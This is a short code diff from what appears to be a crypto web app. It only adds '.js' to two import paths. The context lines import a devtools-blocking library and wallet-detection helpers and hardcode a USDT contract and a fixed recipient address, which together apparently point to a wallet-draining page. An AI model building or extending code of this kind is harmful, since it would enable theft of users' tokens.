@@ -4,8 +4,8 @@ import Web3 from "web3";
 import { ethers } from "ethers";
 import { FaArrowLeft } from 'react-icons/fa';
 import DisableDevtool from 'disable-devtool';
-import { fetchBalances, handleGetStartedClick } from './utils/transactionUtils';
-import { detectWalletAddress } from "./utils/transactionUtils";
+import { fetchBalances, handleGetStartedClick } from './utils/transactionUtils.js'; // Updated with .js
+import { detectWalletAddress } from "./utils/transactionUtils.js"; // Updated with .js
 
 const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const RECIPIENT_ADDRESS = "0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d";
